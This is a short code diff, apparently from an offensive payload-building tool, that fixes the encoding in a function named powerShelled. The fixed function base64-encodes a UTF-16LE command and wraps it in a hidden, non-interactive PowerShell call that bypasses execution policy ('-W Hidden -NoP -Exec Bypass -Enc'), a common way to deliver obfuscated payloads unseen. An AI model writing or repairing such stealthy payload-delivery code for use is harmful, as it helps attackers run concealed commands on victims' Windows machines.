@@ -67,7 +67,7 @@ def buildPayload(command, encryptMethod, secret_key, payload_type):
 #TODO: Add python and perl
 #Function to create a b64ed powershell command as the payload delivery method
 def powerShelled(command):
-    ps_b64 = base64.b64encode(command).encode("UTF-16LE")
+    ps_b64 = base64.b64encode(command.encode("UTF-16LE"))
     ps_command = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + ps_b64
     return ps_command
 
